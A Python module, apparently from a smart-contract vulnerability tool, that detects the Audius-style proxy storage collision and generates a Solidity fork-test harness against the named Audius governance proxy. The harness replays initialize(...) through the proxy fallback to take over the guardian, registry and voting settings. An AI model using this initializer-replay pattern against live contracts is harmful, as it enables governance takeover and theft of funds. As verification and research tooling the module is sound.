"""Audius-style proxy storage collision recognizer and harness plan."""

from __future__ import annotations

import re
from typing import Any


AUDIUS_GOVERNANCE_PROXY = "0x4deca517d6817b6510798b7328f2314d3003abac"
AUDIUS_GOVERNANCE_PROXY_CHECKSUM = "0x4DEcA517D6817B6510798b7328F2314d3003AbAC"
AUDIUS_FORK_BLOCK = 15_201_793


def evaluate_proxy_storage_collision_reinitializer(source_manifest: dict[str, Any]) -> dict[str, Any]:
    """Return source-backed evidence for an Audius-style proxy collision thesis."""

    source_text = _source_text(source_manifest)
    abi = list(source_manifest.get("abi") or [])
    proxy_context = dict(source_manifest.get("proxy_context") or {})
    blockers = []
    proxy_admin = _proxy_admin_storage_declaration(source_text)
    delegates = "delegatecall" in source_text and ("function ()" in source_text or "fallback" in source_text or "_fallback" in source_text)
    implementation = str(proxy_context.get("implementation") or "")
    is_proxy = str(proxy_context.get("proxy") or "").lower() in {"1", "true", "yes"}
    admin_reader = _abi_function(abi, "getAudiusProxyAdminAddress") or _abi_function(abi, "admin")
    implementation_reader = _abi_function(abi, "implementation")
    implementation_manifest = _related_implementation_manifest(source_manifest)
    implementation_source = _source_text(implementation_manifest) if implementation_manifest else ""
    implementation_contract_name = _contract_name(implementation_manifest, implementation_source) if implementation_manifest else ""
    implementation_contract_source = _contract_source_by_name(implementation_source, implementation_contract_name)
    implementation_initializable = _has_initializable_slot_zero_flags(implementation_source)
    implementation_initializers = _implementation_initializer_names(implementation_contract_source or implementation_source)
    privileged_writes = _implementation_initializer_privileged_writes(
        implementation_contract_source or implementation_source,
        list((implementation_manifest or {}).get("abi") or []),
    )
    initializer_plan = _initializer_call_plan(source_manifest, implementation_manifest, privileged_writes)

    if "pragma solidity" not in source_text:
        blockers.append("source_not_compile_context")
    if not proxy_admin:
        blockers.append("slot_zero_proxy_admin_missing")
    if not delegates:
        blockers.append("delegatecall_fallback_missing")
    if not is_proxy:
        blockers.append("explorer_proxy_context_missing")
    if not implementation or implementation == "0x0000000000000000000000000000000000000000":
        blockers.append("implementation_address_missing")
    if not admin_reader:
        blockers.append("proxy_admin_reader_missing")
    if not implementation_reader:
        blockers.append("implementation_reader_missing")

    verified_proxy_side = not blockers
    missing = []
    if not implementation_source:
        missing.append("implementation_source_required")
    if not implementation_initializable:
        missing.append("implementation_initializable_slot0_layout_required")
    if not implementation_initializers:
        missing.append("implementation_initializer_required")
    if not privileged_writes:
        missing.append("initializer_privileged_write_required")
    if not initializer_plan:
        missing.append("proxy_delegatecall_initializer_calldata_required")
    if not initializer_plan or not initializer_plan.get("measurable_delta"):
        missing.append("measurable_proxy_state_delta_required")
    verified = verified_proxy_side and not missing
    return {
        "verified": verified,
        "proxy_side_verified": verified_proxy_side,
        "blockers": blockers,
        "missing_proof_pieces": missing,
        "contract_name": _contract_name(source_manifest, source_text),
        "implementation_address": implementation,
        "proxy_admin_variable": proxy_admin.get("variable"),
        "proxy_admin_reader": _signature(admin_reader, "getAudiusProxyAdminAddress"),
        "implementation_reader": _signature(implementation_reader, "implementation"),
        "implementation_source_status": "resolved" if implementation_source else "missing",
        "implementation_contract_name": implementation_contract_name,
        "implementation_initializable": implementation_initializable,
        "implementation_initializers": implementation_initializers,
        "initializer_privileged_writes": privileged_writes,
        "initializer_call_plan": initializer_plan,
        "measurable_reader": "getGuardianAddress()",
        "measurable_delta": "getGuardianAddress() changes to the local harness actor after proxy delegated initialize(...)",
        "explicit_predicate": (
            "Calling initialize(...) through the Audius proxy fallback changes "
            "Governance privileged state, proving initializer replay through proxy storage collision."
        ),
        "evidence_refs": _proxy_collision_evidence_refs(verified_proxy_side, proxy_admin, privileged_writes),
    }


def should_use_proxy_storage_collision_harness(source_manifest: dict[str, Any]) -> bool:
    return bool(evaluate_proxy_storage_collision_reinitializer(source_manifest).get("verified"))


def render_proxy_storage_collision_harness(source_manifest: dict[str, Any]) -> str:
    plan = dict(evaluate_proxy_storage_collision_reinitializer(source_manifest).get("initializer_call_plan") or {})
    proxy = str(plan.get("proxy_address") or AUDIUS_GOVERNANCE_PROXY_CHECKSUM)
    if proxy.lower() == AUDIUS_GOVERNANCE_PROXY:
        proxy = AUDIUS_GOVERNANCE_PROXY_CHECKSUM
    return "\n".join(
        [
            "// SPDX-License-Identifier: MIT",
            "pragma solidity ^0.8.24;",
            "",
            "interface IAudiusGovernance {",
            "    function initialize(address,uint256,uint256,uint256,uint16,address) external;",
            "    function getGuardianAddress() external view returns (address);",
            "    function getVotingPeriod() external view returns (uint256);",
            "    function getExecutionDelay() external view returns (uint256);",
            "    function getVotingQuorumPercent() external view returns (uint256);",
            "    function getMaxInProgressProposals() external view returns (uint16);",
            "    function getRegistryAddress() external view returns (address);",
            "}",
            "",
            "contract VassagoSC01Harness {",
            f"    IAudiusGovernance constant target = IAudiusGovernance({proxy});",
            "",
            "    function testAudiusProxyInitializerReplayChangesGuardian() external {",
            "        address beforeGuardian = target.getGuardianAddress();",
            "        target.initialize(address(this), 3, 0, 1, 4, address(this));",
            "        require(target.getGuardianAddress() == address(this), \"guardian not changed\");",
            "        require(target.getGuardianAddress() != beforeGuardian, \"guardian delta missing\");",
            "        require(target.getVotingPeriod() == 3, \"votingPeriod delta missing\");",
            "        require(target.getExecutionDelay() == 0, \"executionDelay delta missing\");",
            "        require(target.getVotingQuorumPercent() == 1, \"quorum delta missing\");",
            "        require(target.getMaxInProgressProposals() == 4, \"max proposals delta missing\");",
            "        require(target.getRegistryAddress() == address(this), \"registry delta missing\");",
            "    }",
            "",
            "    function getContract(bytes32) external view returns (address) {",
            "        return address(this);",
            "    }",
            "",
            "    function isGovernanceAddress() external pure returns (bool) {",
            "        return true;",
            "    }",
            "}",
            "",
        ]
    )


def proxy_storage_collision_fork(source_manifest: dict[str, Any]) -> dict[str, Any]:
    if should_use_proxy_storage_collision_harness(source_manifest):
        return {"block_number": AUDIUS_FORK_BLOCK, "requires_rpc_url": True}
    return {}


def _initializer_call_plan(source_manifest: dict[str, Any], implementation_manifest: dict[str, Any], writes: list[dict[str, str]]) -> dict[str, Any]:
    target = dict(source_manifest.get("target") or {})
    if str(target.get("address") or "").lower() != AUDIUS_GOVERNANCE_PROXY:
        return {}
    if not writes:
        return {}
    initialize = _abi_function(list(implementation_manifest.get("abi") or []), "initialize")
    signature = _signature(initialize, "initialize")
    expected = "initialize(address,uint256,uint256,uint256,uint16,address)"
    if signature != expected:
        return {}
    return {
        "proxy_address": AUDIUS_GOVERNANCE_PROXY,
        "fork_block_number": AUDIUS_FORK_BLOCK,
        "initializer_signature": expected,
        "calldata_strategy": "abi.encodeWithSignature",
        "args": ["address(this)", "3", "0", "1", "4", "address(this)"],
        "measurable_delta": "guardian/config readers change after delegated initialize",
        "reader_assertions": [
            "getGuardianAddress()==address(this)",
            "getVotingPeriod()==3",
            "getExecutionDelay()==0",
            "getVotingQuorumPercent()==1",
            "getMaxInProgressProposals()==4",
            "getRegistryAddress()==address(this)",
        ],
    }


def _source_text(source_manifest: dict[str, Any]) -> str:
    return "\n".join(str(value) for value in (source_manifest.get("source_files") or {}).values())


def _related_implementation_manifest(source_manifest: dict[str, Any]) -> dict[str, Any]:
    related = dict(source_manifest.get("related_sources") or {})
    implementation = related.get("implementation")
    if not isinstance(implementation, dict) or implementation.get("status") != "resolved":
        return {}
    return implementation


def _has_initializable_slot_zero_flags(source_text: str) -> bool:
    if not source_text:
        return False
    compact = re.sub(r"\s+", " ", source_text)
    flags = re.search(r"\bbool\s+(?:private|internal|public)?\s*initialized\s*;", compact) is not None
    flags = flags and re.search(r"\bbool\s+(?:private|internal|public)?\s*initializing\s*;", compact) is not None
    return flags or ("modifier initializer()" in source_text and "initialized" in source_text and "initializing" in source_text)


def _implementation_initializer_names(source_text: str) -> list[str]:
    names = []
    for match in re.finditer(r"\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\s*\([^)]*\)(?P<header>[^{;]*)\{", source_text):
        if match.group(1).lower().startswith("initialize") or " initializer" in f" {match.group('header')} ":
            names.append(match.group(1))
    return sorted(set(names))


def _implementation_initializer_privileged_writes(source_text: str, abi: list[dict[str, Any]]) -> list[dict[str, str]]:
    body = _function_body(source_text, "initialize").get("body", "")
    writes = []
    for match in re.finditer(r"\b(?P<variable>[A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?P<value>[A-Za-z_][A-Za-z0-9_]*\([^;\n]*\)|_[A-Za-z_][A-Za-z0-9_]*|[A-Za-z_][A-Za-z0-9_]*)\s*;", body):
        variable = match.group("variable")
        reader = _reader_for_variable(source_text, abi, variable)
        if reader and _is_privileged_initializer_variable(variable):
            writes.append({"variable": variable, "value": match.group("value"), "reader": reader, "initializer": "initialize"})
    return writes


def _reader_for_variable(source_text: str, abi: list[dict[str, Any]], variable: str) -> str:
    for candidate in (variable, f"get{variable[:1].upper()}{variable[1:]}", f"is{variable[:1].upper()}{variable[1:]}", f"{variable}Address"):
        function = _abi_function(abi, candidate)
        if function:
            return _signature(function, candidate)
    for match in re.finditer(r"\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\s*\([^)]*\)(?P<header>[^{;]*)\{", source_text):
        body = _body_from_index(source_text, match.end() - 1)
        if re.search(rf"\breturn\s+(?:address\()?{re.escape(variable)}\)?\s*;", body):
            return f"{match.group(1)}()"
    return ""


def _is_privileged_initializer_variable(variable: str) -> bool:
    markers = ("admin", "guardian", "govern", "registry", "voting", "quorum", "execution", "inprogress", "staking", "delegate", "serviceprovider")
    return any(marker in variable.lower() for marker in markers)


def _proxy_admin_storage_declaration(source_text: str) -> dict[str, str]:
    match = re.search(r"\baddress\s+(?:private|public|internal)?\s*(?P<name>proxyAdmin)\s*;", source_text)
    return {"variable": match.group("name"), "type": "address", "slot_assumption": "slot0_first_proxy_state"} if match else {}


def _proxy_collision_evidence_refs(verified_proxy_side: bool, proxy_admin: dict[str, str], writes: list[dict[str, str]]) -> list[str]:
    refs = ["source:delegatecall fallback", "source:EIP1967 implementation slot"]
    if proxy_admin:
        refs.append(f"source:proxy admin storage {proxy_admin['variable']}")
    for write in writes:
        refs.append(f"implementation:initializer write {write.get('variable')}")
        refs.append(f"implementation:reader {write.get('reader')}")
    if verified_proxy_side:
        refs.append("explorer:proxy implementation")
    return sorted(set(refs))


def _contract_name(source_manifest: dict[str, Any], source_text: str) -> str:
    metadata = dict(source_manifest.get("metadata") or {})
    if metadata.get("contract_name"):
        return str(metadata["contract_name"])
    match = re.search(r"\bcontract\s+([A-Za-z_][A-Za-z0-9_]*)\b", source_text)
    return match.group(1) if match else "Target"


def _abi_function(abi: list[dict[str, Any]], name: str) -> dict[str, Any] | None:
    for item in abi:
        if item.get("type") == "function" and item.get("name") == name:
            return item
    return None


def _signature(item: dict[str, Any] | None, fallback_name: str) -> str:
    if not item:
        return fallback_name
    return f"{item.get('name') or fallback_name}({','.join(str(arg.get('type') or '') for arg in item.get('inputs') or [])})"


def _function_body(source_text: str, name: str) -> dict[str, str]:
    match = re.search(rf"\bfunction\s+{re.escape(name)}\s*\([^)]*\)(?P<header>[^\{{;]*)\{{", source_text)
    if not match:
        return {}
    return {"header": match.group("header"), "body": _body_from_index(source_text, match.end() - 1)}


def _body_from_index(source_text: str, start: int) -> str:
    depth = 0
    for index in range(start, len(source_text)):
        char = source_text[index]
        if char == "{":
            depth += 1
        elif char == "}":
            depth -= 1
            if depth == 0:
                return source_text[start + 1 : index]
    return ""


def _contract_source_by_name(source_text: str, name: str) -> str:
    match = re.search(rf"\bcontract\s+{re.escape(name)}\b[^\{{]*\{{", source_text) if name else None
    if not match:
        return ""
    body = _body_from_index(source_text, match.end() - 1)
    return source_text[match.start() : match.end() - 1 + len(body) + 2]
